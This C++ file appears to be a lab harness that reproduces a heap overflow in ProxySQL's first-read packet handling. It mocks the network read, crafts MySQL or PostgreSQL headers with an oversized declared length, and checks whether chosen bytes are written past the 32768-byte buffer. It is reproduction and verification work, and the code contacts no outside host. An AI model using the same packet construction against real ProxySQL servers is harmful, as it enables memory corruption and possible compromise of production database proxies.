// Frontier harness for ProxySQL CVE-2026-48773 / GHSA-58ww-865x-grpr.
// The first-read block between the BEGIN/END markers is extracted verbatim
// from a pinned upstream release by run.sh; everything else is a harness stub.
// Boundary and collaborator list: see PROVENANCE.md.

#include <cstdarg>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <malloc.h>
#include <sys/types.h>
#include <sys/mman.h>

typedef unsigned int u_int;
typedef unsigned char u_char;

// Harness stand-in for include/proxysql_structs.h:928-930 (PtrSize_t shape
// from the same pinned header): only the fields the pinned block touches.
struct _PtrSize_t { void *ptr; unsigned int size; };
typedef struct _PtrSize_t PtrSize_t;
struct _mysql_hdr { u_int pkt_length:24, pkt_id:8; };
typedef struct _mysql_hdr mysql_hdr;

#define QUEUE_T_DEFAULT_SIZE 32768
typedef struct _queue_t {
	void *buffer;
	unsigned int size;
	unsigned int head;
	unsigned int tail;
	unsigned int partial;
	PtrSize_t pkt;
	mysql_hdr hdr;
} queue_t;

// Verbatim from the pinned first-read .cpp files (queue_available and
// queue_w_ptr are identical in both v3.0.8 and v3.0.9).
#define queue_available(_q) (_q.size-_q.head)
#define queue_w_ptr(_q) ((unsigned char *)_q.buffer+_q.head)

static unsigned char g_payload[131072];
static size_t g_payload_len = 131072;
static int g_shut = 0;
static int g_recv_calls = 0;
static int g_last_pinned_line = 0;
static size_t g_last_recv_len = 0;

// Two 16-byte stripes make "chosen bytes at chosen offsets" observable.
static unsigned char chosen_byte(size_t i) {
	return ((i / 16) & 1) ? 0x42 : 0x41;
}

static void proxy_error(const char* fmt, ...) {
	va_list ap;
	va_start(ap, fmt);
	fputs("FIXED_LOG ", stdout);
	vprintf(fmt, ap);
	va_end(ap);
}

// recv() collaborator: the client supplies exactly the declared number of
// bytes, taken from the synthetic in-memory payload. No socket is created.
static ssize_t lab_recv_at(int pinned_line, int fd, void* buf, size_t len, int flags) {
	(void)fd;
	(void)flags;
	g_recv_calls++;
	g_last_pinned_line = pinned_line;
	g_last_recv_len = len;
	printf("RECV_CALL pinned_line=%d len=%zu\n", pinned_line, len);
	unsigned char* out = static_cast<unsigned char*>(buf);
	memcpy(out, g_payload, len);
	return static_cast<ssize_t>(len);
}
#define recv(fd, buf, len, flags) lab_recv_at(__LINE__, (fd), (buf), (len), (flags))
#define shut_soft() (g_shut = 1)

struct DataStream {
	queue_t queueIN;
	int fd;
	bool encrypted;
	int pkts_recv;

	DataStream() : fd(7), encrypted(false), pkts_recv(0) {
#ifdef __SANITIZE_ADDRESS__
		// Real 32768-byte heap allocation: ASan polices the exact boundary.
		queueIN.buffer = malloc(QUEUE_T_DEFAULT_SIZE);
		memset(queueIN.buffer, 0, malloc_usable_size(queueIN.buffer));
#else
		// Guard mapping so a multi-KB chosen write stays inside mapped memory;
		// the logical queue still begins 65536 bytes into the mapping.
		void* region = mmap(NULL, 262144, PROT_READ | PROT_WRITE,
		                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (region == MAP_FAILED) { perror("mmap"); exit(2); }
		memset(region, 0, 262144);
		queueIN.buffer = static_cast<unsigned char*>(region) + 65536;
#endif
		queueIN.size = QUEUE_T_DEFAULT_SIZE;
		queueIN.head = 0;
		queueIN.tail = 0;
		queueIN.partial = 0;
	}

	~DataStream() {} // intentionally leak: a corrupted plain-build heap must not be freed

	int first_read() {
// BEGIN PINNED FIRST-READ BLOCK
@@BLOCK@@
// END PINNED FIRST-READ BLOCK
#ifdef MYSQL_FIRST_READ
	} // harness: closes the pinned `if (encrypted == false)` at v3.0.8:671 / v3.0.9:689
#endif
		return r;
	}
};

int main(int argc, char** argv) {
	if (argc != 3) {
		fprintf(stderr, "usage: %s mysql|pgsql DECLARED_LEN\n", argv[0]);
		return 2;
	}
	const char* proto = argv[1];
	const unsigned long declared = strtoul(argv[2], NULL, 10);
	unsigned int hdr_size = 0;

	if (strcmp(proto, "mysql") == 0) {
		// 3-byte little-endian MySQL packet length plus sequence id.
		g_payload[0] = (unsigned char)(declared & 0xff);
		g_payload[1] = (unsigned char)((declared >> 8) & 0xff);
		g_payload[2] = (unsigned char)((declared >> 16) & 0xff);
		g_payload[3] = 1;
		for (size_t i = 4; i < g_payload_len; i++) g_payload[i] = chosen_byte(i);
		hdr_size = 4;
	} else if (strcmp(proto, "pgsql") == 0) {
		// byte 0 is both the packet type and the top length byte; with type 0
		// the pinned parser reads buff[0..3] as the big-endian length.
		g_payload[0] = (unsigned char)((declared >> 24) & 0xff);
		g_payload[1] = (unsigned char)((declared >> 16) & 0xff);
		g_payload[2] = (unsigned char)((declared >> 8) & 0xff);
		g_payload[3] = (unsigned char)(declared & 0xff);
		g_payload[4] = chosen_byte(4);
		for (size_t i = 5; i < g_payload_len; i++) g_payload[i] = chosen_byte(i);
		hdr_size = 5;
	} else {
		fprintf(stderr, "unknown protocol %s\n", proto);
		return 2;
	}

	DataStream ds;
	int rc = ds.first_read();
#ifdef __SANITIZE_ADDRESS__
	size_t usable = malloc_usable_size(ds.queueIN.buffer);
#else
	size_t usable = 0; // guard mapping: no malloc chunk to inspect
#endif
	size_t written = (size_t)hdr_size + declared;
	size_t past = (written > QUEUE_T_DEFAULT_SIZE) ? written - QUEUE_T_DEFAULT_SIZE : 0;
	printf("RESULT proto=%s declared=%lu rc=%d accepted=%d shut=%d recv_calls=%d last_pinned_line=%d "
	       "last_recv_len=%zu capacity=%d usable=%zu bytes_past=%zu\n",
	       proto, declared, rc, (rc >= 0) ? 1 : 0, g_shut, g_recv_calls, g_last_pinned_line,
	       g_last_recv_len, QUEUE_T_DEFAULT_SIZE, usable, past);

#ifndef __SANITIZE_ADDRESS__
	// Plain build only: read the bytes just past the 32768-byte allocation.
	// The queue was zeroed before first_read(), so zero means untouched.
	unsigned char* q = static_cast<unsigned char*>(ds.queueIN.buffer);
	size_t idx0 = (size_t)QUEUE_T_DEFAULT_SIZE - hdr_size;
	unsigned char e0 = chosen_byte(idx0);
	unsigned char e1 = chosen_byte(idx0 + 16);
	unsigned char g0 = q[QUEUE_T_DEFAULT_SIZE];
	unsigned char g1 = q[QUEUE_T_DEFAULT_SIZE + 16];
	printf("BOUNDARY proto=%s at0=%02x exp0=%02x at16=%02x exp16=%02x "
	       "CHOSEN_MATCH=%d UNTOUCHED=%d\n",
	       proto, g0, e0, g1, e1,
	       (g0 == e0 && g1 == e1) ? 1 : 0,
	       (g0 == 0 && g1 == 0) ? 1 : 0);
#endif
	return 0;
}
